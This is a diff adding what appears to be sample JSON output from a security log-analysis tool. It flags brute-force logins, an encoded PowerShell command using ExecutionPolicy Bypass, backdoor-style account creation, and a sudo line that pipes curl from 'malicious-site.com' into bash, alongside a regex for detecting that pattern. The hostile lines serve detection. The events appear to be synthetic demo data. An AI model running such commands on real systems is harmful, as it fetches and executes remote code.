@@ -1,0 +1,394 @@
+{
+    "log_file": "Demo Analysis",
+    "log_type": "Mixed (Windows + Linux)",
+    "analysis_time": "2025-07-31T10:56:39.782652",
+    "total_events": 27,
+    "alerts": [
+        {
+            "type": "brute_force_attack",
+            "severity": "HIGH",
+            "description": "Brute force attack detected: 5 failed login attempts for user \"administrator\" from 10.0.0.50 within 5 minutes",
+            "timestamp": "2024-01-15T14:20:15.123000+00:00",
+            "user": "administrator",
+            "source_ip": "10.0.0.50",
+            "failure_count": 5,
+            "events": [
+                {
+                    "event_id": 4625,
+                    "timestamp": "2024-01-15T14:20:15.123Z",
+                    "computer": "SERVER-01",
+                    "log_type": "windows",
+                    "description": "Account Logon Failed",
+                    "user": "administrator",
+                    "source_ip": "10.0.0.50",
+                    "logon_type": "3",
+                    "success": false,
+                    "raw_data": {
+                        "TargetUserName": "administrator",
+                        "IpAddress": "10.0.0.50",
+                        "LogonType": "3",
+                        "Status": "0xC000006D"
+                    }
+                },
+                {
+                    "event_id": 4625,
+                    "timestamp": "2024-01-15T14:21:15.123Z",
+                    "computer": "SERVER-01",
+                    "log_type": "windows",
+                    "description": "Account Logon Failed",
+                    "user": "administrator",
+                    "source_ip": "10.0.0.50",
+                    "logon_type": "3",
+                    "success": false,
+                    "raw_data": {
+                        "TargetUserName": "administrator",
+                        "IpAddress": "10.0.0.50",
+                        "LogonType": "3",
+                        "Status": "0xC000006D"
+                    }
+                },
+                {
+                    "event_id": 4625,
+                    "timestamp": "2024-01-15T14:22:15.123Z",
+                    "computer": "SERVER-01",
+                    "log_type": "windows",
+                    "description": "Account Logon Failed",
+                    "user": "administrator",
+                    "source_ip": "10.0.0.50",
+                    "logon_type": "3",
+                    "success": false,
+                    "raw_data": {
+                        "TargetUserName": "administrator",
+                        "IpAddress": "10.0.0.50",
+                        "LogonType": "3",
+                        "Status": "0xC000006D"
+                    }
+                },
+                {
+                    "event_id": 4625,
+                    "timestamp": "2024-01-15T14:23:15.123Z",
+                    "computer": "SERVER-01",
+                    "log_type": "windows",
+                    "description": "Account Logon Failed",
+                    "user": "administrator",
+                    "source_ip": "10.0.0.50",
+                    "logon_type": "3",
+                    "success": false,
+                    "raw_data": {
+                        "TargetUserName": "administrator",
+                        "IpAddress": "10.0.0.50",
+                        "LogonType": "3",
+                        "Status": "0xC000006D"
+                    }
+                },
+                {
+                    "event_id": 4625,
+                    "timestamp": "2024-01-15T14:24:15.123Z",
+                    "computer": "SERVER-01",
+                    "log_type": "windows",
+                    "description": "Account Logon Failed",
+                    "user": "administrator",
+                    "source_ip": "10.0.0.50",
+                    "logon_type": "3",
+                    "success": false,
+                    "raw_data": {
+                        "TargetUserName": "administrator",
+                        "IpAddress": "10.0.0.50",
+                        "LogonType": "3",
+                        "Status": "0xC000006D"
+                    }
+                }
+            ]
+        },
+        {
+            "type": "powershell_base64",
+            "severity": "HIGH",
+            "description": "PowerShell Base64 encoded command detected",
+            "timestamp": "2024-01-15T10:35:22.456Z",
+            "user": "SYSTEM",
+            "command": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA==",
+            "decoded_content": [
+                "$\u0000s\u0000=\u0000N\u0000e\u0000w\u0000-\u0000O\u0000b\u0000j\u0000e\u0000c\u0000t"
+            ],
+            "computer": "WORKSTATION-01",
+            "event": {
+                "event_id": 4688,
+                "timestamp": "2024-01-15T10:35:22.456Z",
+                "computer": "WORKSTATION-01",
+                "log_type": "windows",
+                "description": "Process Created",
+                "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "command_line": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA==",
+                "parent_process": "C:\\Windows\\System32\\cmd.exe",
+                "user": "SYSTEM",
+                "raw_data": {
+                    "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                    "CommandLine": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA==",
+                    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+                    "SubjectUserName": "SYSTEM"
+                }
+            }
+        },
+        {
+            "type": "suspicious_powershell",
+            "severity": "MEDIUM",
+            "description": "Suspicious PowerShell keyword detected: bypass",
+            "timestamp": "2024-01-15T10:35:22.456Z",
+            "user": "SYSTEM",
+            "command": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA==",
+            "keyword": "bypass",
+            "computer": "WORKSTATION-01",
+            "event": {
+                "event_id": 4688,
+                "timestamp": "2024-01-15T10:35:22.456Z",
+                "computer": "WORKSTATION-01",
+                "log_type": "windows",
+                "description": "Process Created",
+                "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "command_line": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA==",
+                "parent_process": "C:\\Windows\\System32\\cmd.exe",
+                "user": "SYSTEM",
+                "raw_data": {
+                    "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                    "CommandLine": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA==",
+                    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+                    "SubjectUserName": "SYSTEM"
+                }
+            }
+        },
+        {
+            "type": "off_hours_activity",
+            "severity": "MEDIUM",
+            "description": "Suspicious activity outside business hours: User Account Created",
+            "timestamp": "2024-01-15T02:15:33.789Z",
+            "user": "backdoor_user",
+            "activity": "User Account Created",
+            "computer": "DC-01",
+            "event": {
+                "event_id": 4720,
+                "timestamp": "2024-01-15T02:15:33.789Z",
+                "computer": "DC-01",
+                "log_type": "windows",
+                "description": "User Account Created",
+                "target_user": "backdoor_user",
+                "subject_user": "administrator",
+                "raw_data": {
+                    "TargetUserName": "backdoor_user",
+                    "SubjectUserName": "administrator"
+                }
+            }
+        },
+        {
+            "type": "suspicious_command",
+            "severity": "MEDIUM",
+            "description": "Suspicious command pattern detected",
+            "timestamp": "2025-07-31T09:06:39.779651",
+            "user": "www-data",
+            "command": "/bin/bash -c \"curl -s http://malicious-site.com/shell.sh | bash\"",
+            "pattern": "curl.*\\|\\s*bash",
+            "computer": "web-server-01",
+            "event": {
+                "timestamp": "2025-07-31T09:06:39.779651",
+                "hostname": "web-server-01",
+                "process": "sudo",
+                "event_type": "authentication",
+                "pattern": "sudo_command",
+                "user": "www-data",
+                "command": "/bin/bash -c \"curl -s http://malicious-site.com/shell.sh | bash\"",
+                "description": "Sudo command executed by www-data: /bin/bash -c \"curl -s http://malicious-site.com/shell.sh | bash\"",
+                "raw_message": "www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash -c \"curl -s http://malicious-site.com/shell.sh | bash\"",
+                "log_type": "linux",
+                "line_number": 1387
+            }
+        },
+        {
+            "type": "suspicious_user_creation",
+            "severity": "HIGH",
+            "description": "Suspicious user account created: backup_admin",
+            "timestamp": "2025-07-31T10:26:39.779651",
+            "created_user": "backup_admin",
+            "created_by": "Unknown",
+            "computer": "db-server-02",
+            "event": {
+                "timestamp": "2025-07-31T10:26:39.779651",
+                "hostname": "db-server-02",
+                "process": "useradd",
+                "event_type": "authentication",
+                "pattern": "user_add",
+                "user": "backup_admin",
+                "description": "User added: backup_admin",
+                "raw_message": "new user: name=backup_admin, UID=1001, GID=1001, home=/home/backup_admin, shell=/bin/bash",
+                "log_type": "linux",
+                "line_number": 2156
+            }
+        }
+    ],
+    "events": [
+        {
+            "event_id": 4625,
+            "timestamp": "2024-01-15T10:30:15.123Z",
+            "computer": "WORKSTATION-01",
+            "log_type": "windows",
+            "description": "Account Logon Failed",
+            "user": "admin",
+            "source_ip": "192.168.1.100",
+            "logon_type": "3",
+            "success": false,
+            "raw_data": {
+                "TargetUserName": "admin",
+                "IpAddress": "192.168.1.100",
+                "LogonType": "3",
+                "Status": "0xC000006D"
+            }
+        },
+        {
+            "event_id": 4688,
+            "timestamp": "2024-01-15T10:35:22.456Z",
+            "computer": "WORKSTATION-01",
+            "log_type": "windows",
+            "description": "Process Created",
+            "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA==",
+            "parent_process": "C:\\Windows\\System32\\cmd.exe",
+            "user": "SYSTEM",
+            "raw_data": {
+                "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "CommandLine": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA==",
+                "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+                "SubjectUserName": "SYSTEM"
+            }
+        },
+        {
+            "event_id": 4720,
+            "timestamp": "2024-01-15T02:15:33.789Z",
+            "computer": "DC-01",
+            "log_type": "windows",
+            "description": "User Account Created",
+            "target_user": "backdoor_user",
+            "subject_user": "administrator",
+            "raw_data": {
+                "TargetUserName": "backdoor_user",
+                "SubjectUserName": "administrator"
+            }
+        },
+        {
+            "event_id": 4625,
+            "timestamp": "2024-01-15T14:20:15.123Z",
+            "computer": "SERVER-01",
+            "log_type": "windows",
+            "description": "Account Logon Failed",
+            "user": "administrator",
+            "source_ip": "10.0.0.50",
+            "logon_type": "3",
+            "success": false,
+            "raw_data": {
+                "TargetUserName": "administrator",
+                "IpAddress": "10.0.0.50",
+                "LogonType": "3",
+                "Status": "0xC000006D"
+            }
+        },
+        {
+            "event_id": 4625,
+            "timestamp": "2024-01-15T14:21:15.123Z",
+            "computer": "SERVER-01",
+            "log_type": "windows",
+            "description": "Account Logon Failed",
+            "user": "administrator",
+            "source_ip": "10.0.0.50",
+            "logon_type": "3",
+            "success": false,
+            "raw_data": {
+                "TargetUserName": "administrator",
+                "IpAddress": "10.0.0.50",
+                "LogonType": "3",
+                "Status": "0xC000006D"
+            }
+        },
+        {
+            "event_id": 4625,
+            "timestamp": "2024-01-15T14:22:15.123Z",
+            "computer": "SERVER-01",
+            "log_type": "windows",
+            "description": "Account Logon Failed",
+            "user": "administrator",
+            "source_ip": "10.0.0.50",
+            "logon_type": "3",
+            "success": false,
+            "raw_data": {
+                "TargetUserName": "administrator",
+                "IpAddress": "10.0.0.50",
+                "LogonType": "3",
+                "Status": "0xC000006D"
+            }
+        },
+        {
+            "event_id": 4625,
+            "timestamp": "2024-01-15T14:23:15.123Z",
+            "computer": "SERVER-01",
+            "log_type": "windows",
+            "description": "Account Logon Failed",
+            "user": "administrator",
+            "source_ip": "10.0.0.50",
+            "logon_type": "3",
+            "success": false,
+            "raw_data": {
+                "TargetUserName": "administrator",
+                "IpAddress": "10.0.0.50",
+                "LogonType": "3",
+                "Status": "0xC000006D"
+            }
+        },
+        {
+            "event_id": 4625,
+            "timestamp": "2024-01-15T14:24:15.123Z",
+            "computer": "SERVER-01",
+            "log_type": "windows",
+            "description": "Account Logon Failed",
+            "user": "administrator",
+            "source_ip": "10.0.0.50",
+            "logon_type": "3",
+            "success": false,
+            "raw_data": {
+                "TargetUserName": "administrator",
+                "IpAddress": "10.0.0.50",
+                "LogonType": "3",
+                "Status": "0xC000006D"
+            }
+        },
+        {
+            "event_id": 4625,
+            "timestamp": "2024-01-15T14:25:15.123Z",
+            "computer": "SERVER-01",
+            "log_type": "windows",
+            "description": "Account Logon Failed",
+            "user": "administrator",
+            "source_ip": "10.0.0.50",
+            "logon_type": "3",
+            "success": false,
+            "raw_data": {
+                "TargetUserName": "administrator",
+                "IpAddress": "10.0.0.50",
+                "LogonType": "3",
+                "Status": "0xC000006D"
+            }
+        },
+        {
+            "event_id": 4625,
+            "timestamp": "2024-01-15T14:26:15.123Z",
+            "computer": "SERVER-01",
+            "log_type": "windows",
+            "description": "Account Logon Failed",
+            "user": "administrator",
+            "source_ip": "10.0.0.50",
+            "logon_type": "3",
+            "success": false,
+            "raw_data": {
+                "TargetUserName": "administrator",
+                "IpAddress": "10.0.0.50",
+                "LogonType": "3",
+                "Status": "0xC000006D"
+            }
+        }
+    ]
+}
